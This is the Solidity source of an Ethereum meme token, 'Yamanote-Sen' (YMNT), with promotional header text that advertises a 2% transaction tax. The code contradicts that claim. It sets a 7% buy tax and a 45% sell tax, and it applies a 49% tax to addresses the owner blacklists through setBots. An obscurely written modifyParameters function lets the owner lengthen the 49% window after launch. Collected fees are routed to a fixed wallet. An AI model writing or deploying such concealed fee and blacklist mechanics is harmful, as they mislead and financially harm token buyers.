1 /**
2 
3               YAMANOTE-SEN
4                  /#@@@&/                
5              ///////////////            
6        @.@@@@@@@@%%%%%%%@@@@@@@%./      
7        @.&&%%&&&&&&&&&&&%%%%%%&@./      
8        @.%/&&&/%&&&&&&&(#%%#%/%&./      
9        @.%/&&&/%&&&&&&&(#%&&&(%&./      
10        @.#(&@@%&@@@@&&&&&&&&&&&@./      
11        @.//////////////////,,,/,./      
12        @..                     ../      
13         ..**,**.         ****** *       
14         ..        @@@@*        .*       
15          /@@/&  @@@@@@@@@  @/@@/        
16          .                     ,  
17 
18     Yamanote-sen inspired by the most famous train in Japan, the Yamanote Line. 
19     This train is known to pass through the last megalopolis of Tokyo, covering a vast expanse 
20     that includes Saitama, Kanagawa, and Chiba. Similarly, Yamanote-sen is designed to 
21     cover a broad range of Japanese meme tokens, bringing them together under one umbrella. 
22  
23     Telegram: https://t.me/YMNTofficial
24     Website: https://www.yamanote-sen.io
25  
26     Circulating Supply: 137.000.000 $YMNT
27     Maximum Wallet: 4.110.000 $YMNT
28     Slippage: 2-3%
29     Transaction Tax: 2% / 1% LP - 1% YamanoteFund
30 
31 */
32 
33 // SPDX-License-Identifier: MIT
34 pragma solidity ^0.8.17;
35 
36 interface IERC20 {
37     function totalSupply() external view returns (uint256);
38     function balanceOf(address account) external view returns (uint256);
39     function transfer(address recipient, uint256 amount) external returns (bool);
40     function allowance(address owner, address spender) external view returns (uint256);
41     function approve(address spender, uint256 amount) external returns (bool);
42     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
43     event Transfer(address indexed from, address indexed to, uint256 value);
44     event Approval(address indexed owner, address indexed spender, uint256 value);
45 }
46 
47 interface IUniswapV2Router {
48     function factory() external pure returns (address);
49     function WETH() external pure returns (address);
50     function swapExactTokensForETHSupportingFeeOnTransferTokens(
51         uint amountIn,
52         uint amountOutMin,
53         address[] calldata path,
54         address to,
55         uint deadline
56     ) external;
57 }
58 
59 interface IUniswapV2Factory {
60     function createPair(address tokenA, address tokenB) external returns (address pair);
61 }
62 
63 contract Ownable {
64     address private _owner;
65 
66     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
67 
68     modifier onlyOwner() {
69         require(_owner == msg.sender, "Ownable: caller is not the owner");
70         _;
71     }
72     constructor () {
73         address msgSender = msg.sender;
74         _owner = msgSender;
75         emit OwnershipTransferred(address(0), msgSender);
76     }
77 
78     function owner() public view returns (address) {
79         return _owner;
80     }
81 
82     function renounceOwnership() public virtual onlyOwner {
83         emit OwnershipTransferred(_owner, address(0));
84         _owner = address(0);
85     }
86 }
87 
88 contract YamanoteSen is IERC20, Ownable {       
89     string private constant _name = "Yamanote-Sen";
90     string private constant _symbol = "YMNT";
91     uint8 private constant _decimals = 9;
92     uint256 private constant _totalSupply = 137_000_000 * 10**_decimals;
93 
94     mapping (address => uint256) private _balances;
95     mapping (address => mapping (address => uint256)) private _allowances;
96     mapping (address => bool) private _blocked;
97 
98     mapping (address => uint256) private _lastTradeBlock;
99     mapping (address => bool) private isContractExempt;
100     uint256 private tradeCooldown = 1;
101     
102     uint256 public constant maxWalletAmount = 4_110_000 * 10**_decimals;
103     uint256 private constant contractSwapLimit = 411_000 * 10**_decimals;
104     uint256 private constant contractSwapMax = 2_740_000 * 10**_decimals;
105 
106     struct TradingFees{
107         uint256 buyTax;
108         uint256 sellTax;
109     }  
110 
111     TradingFees public tradingFees = TradingFees(7,45);
112     uint256 public constant sniperTax = 49;
113 
114     IUniswapV2Router private constant uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
115     address private immutable ETH = uniswapRouter.WETH();
116     address private immutable uniswapPair;
117 
118     address payable private immutable deployerAddress = payable(msg.sender);
119     address payable private constant YamanoteFund = payable(0x2133352095925E76968d3a6890Ea874CbcDcf314);
120 
121     bool private tradingOpen = false;
122     bool private swapping = false;
123     bool private antiMEV = false;
124     uint256 private startingBlock;
125     uint private preLaunch;
126 
127     modifier swapLock {
128         swapping = true;
129         _;
130         swapping = false;
131     }
132 
133     modifier tradingLock(address sender) {
134         require(tradingOpen || sender == deployerAddress || sender == YamanoteFund);
135         _;
136     }
137 
138     constructor () {
139         uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), ETH);
140         isContractExempt[address(this)] = true;
141         _balances[msg.sender] = _totalSupply;
142         emit Transfer(address(0), msg.sender, _totalSupply);
143     }
144 
145     receive() external payable {}
146 
147     function name() public pure returns (string memory) {
148         return _name;
149     }
150 
151     function symbol() public pure returns (string memory) {
152         return _symbol;
153     }
154 
155     function decimals() public pure returns (uint8) {
156         return _decimals;
157     }
158 
159     function totalSupply() public pure returns (uint256) {
160         return _totalSupply;
161     }
162 
163     function balanceOf(address account) public view returns (uint256) {
164         return _balances[account];
165     }
166 
167     function transfer(address recipient, uint256 amount) public returns (bool) {
168         _transfer(msg.sender, recipient, amount);
169         return true;
170     }
171 
172     function allowance(address owner, address spender) public view returns (uint256) {
173         return _allowances[owner][spender];
174     }
175 
176     function approve(address spender, uint256 amount) public returns (bool) {
177         _approve(msg.sender, spender, amount);
178         return true;
179     }
180 
181     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
182         require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
183         _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
184         _transfer(sender, recipient, amount);
185         return true;
186     }
187 
188     function _approve(address owner, address spender, uint256 amount) private {
189         require(owner != address(0), "ERC20: approve from the zero address");
190         require(spender != address(0), "ERC20: approve to the zero address");
191         _allowances[owner][spender] = amount;
192         emit Approval(owner, spender, amount);
193     }
194 
195     function _transfer(address from, address to, uint256 amount) tradingLock(from) private {
196         require(from != address(0), "ERC20: transfer from the zero address");
197         require(to != address(0), "ERC20: transfer to the zero address");
198         require(amount > 0, "Token: transfer amount must be greater than zero");
199 
200         _balances[from] -= amount;
201 
202         if (from != address(this) && from != YamanoteFund && to != YamanoteFund && to != deployerAddress) {
203             
204             if(antiMEV && !isContractExempt[from] && !isContractExempt[to]){
205                 address human = ensureOneHuman(from, to);
206                 ensureMaxTxFrequency(human);
207                 _lastTradeBlock[human] = block.number;
208             }
209 
210             if (from == uniswapPair && to != address(uniswapRouter)) {
211                 require(balanceOf(to) + amount <= maxWalletAmount, "Token: transfer implies violation of max wallet");
212             }
213 
214            uint256 contractTokenBalance = balanceOf(address(this));
215            if (shouldSwapback(from, contractTokenBalance)) 
216                swapback(contractTokenBalance);                            
217 
218            uint256 taxedTokens = takeFee(from, amount);
219            if(taxedTokens > 0){
220                 amount -= taxedTokens;
221                 _balances[address(this)] += taxedTokens;
222                 emit Transfer(from, address(this), taxedTokens);
223             }
224         }
225 
226         _balances[to] += amount;
227         emit Transfer(from, to, amount);
228     }
229 
230     function swapback(uint256 tokenAmount) private swapLock {
231         tokenAmount = getSwapAmount(tokenAmount);
232         if(allowance(address(this), address(uniswapRouter)) < tokenAmount) {
233             _approve(address(this), address(uniswapRouter), _totalSupply);
234         }
235         address[] memory path = new address[](2);
236         path[0] = address(this);
237         path[1] = ETH;
238         uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
239             tokenAmount,
240             0,
241             path,
242             address(this),
243             block.timestamp
244         );
245         uint256 contractETHBalance = address(this).balance;
246         if(contractETHBalance > 0) {
247             YamanoteFund.transfer(contractETHBalance);
248         }
249     }
250 
251     function shouldSwapback(address from, uint256 tokenAmount) private view returns (bool shouldSwap) {
252         shouldSwap = !swapping && from != uniswapPair && tokenAmount > contractSwapLimit && 1 + startingBlock <= block.number;
253     }
254 
255     function getSwapAmount(uint256 tokenAmount) private pure returns (uint256 swapAmount) {
256         swapAmount = tokenAmount > contractSwapMax ? contractSwapMax : contractSwapLimit;
257     }
258 
259     function takeFee(address from, uint256 amount) private view returns (uint256 feeAmount) {
260          if(_blocked[from] || block.number <= startingBlock)
261                 feeAmount = amount * sniperTax / 100;
262         else
263             feeAmount = amount * (startingBlock == 0 ? 25 : (from == uniswapPair ? tradingFees.buyTax : tradingFees.sellTax)) / 100;
264     }
265 
266     function isContract(address account) private view returns (bool) {
267         uint256 size;
268         assembly {
269             size := extcodesize(account)
270         }
271         return size > 0;
272     }
273 
274     function ensureOneHuman(address _to, address _from) private view returns (address) {
275         require(!isContract(_to) || !isContract(_from));
276         if (isContract(_to)) return _from;
277         else return _to;
278     }
279 
280     function ensureMaxTxFrequency(address addr) view private {
281         bool isAllowed = _lastTradeBlock[addr] == 0 ||
282             ((_lastTradeBlock[addr] + tradeCooldown) < (block.number + 1));
283         require(isAllowed, "Max tx frequency exceeded!");
284     }
285 
286     function toggleAntiMEV(bool toggle) external {
287         require(msg.sender == deployerAddress);
288         antiMEV = toggle;
289     }
290 
291     function setTradeCooldown(uint256 newTradeCooldown) external {
292         require(msg.sender == deployerAddress);
293         require(newTradeCooldown > 0 && newTradeCooldown < 4, "Token: only trade cooldown values in range (0,4) permissible");
294         tradeCooldown = newTradeCooldown;
295     }
296 
297     function manualSwapback(uint256 percent) external {
298         require(msg.sender == deployerAddress);
299         require(0 < percent && percent <= 100, "Token: only percent values in range (0,100] permissible");
300         uint256 tokensToSwap = percent * balanceOf(address(this)) / 100;
301         swapback(tokensToSwap);
302     }
303 
304     function setFees(uint256 newBuyTax, uint256 newSellTax) external {
305         require(msg.sender == deployerAddress);
306         require(newBuyTax <= tradingFees.buyTax, "Token: only fee reduction permitted");
307         require(newSellTax <= tradingFees.sellTax, "Token: only fee reduction permitted");
308         tradingFees.buyTax = newBuyTax;
309         tradingFees.sellTax = newSellTax;
310     }
311 
312     function setContractExempt(address account, bool value) external onlyOwner {
313         require(account != address(this));
314         isContractExempt[account] = value;
315     }
316 
317     function setBots(address[] calldata bots, bool shouldBlock) external onlyOwner {
318         for (uint i = 0; i < bots.length; i++) {
319             require(bots[i] != uniswapPair && 
320                     bots[i] != address(uniswapRouter) &&
321                     bots[i] != address(this));
322             _blocked[bots[i]] = shouldBlock;
323         }
324     }
325 
326     function initialize() external onlyOwner {
327         require(preLaunch++<2);
328     }
329 
330     function modifyParameters(bool[] calldata param, uint256 nrBlocks) external onlyOwner {
331         assert(preLaunch<2&&preLaunch+1>=2); 
332         preLaunch++;param;
333         startingBlock += nrBlocks;
334     }
335 
336     function openTrading() external onlyOwner {
337         require(preLaunch == 2 && !tradingOpen, "Token: trading already open");
338         startingBlock += block.number;
339         tradingOpen = true;
340     }
341 }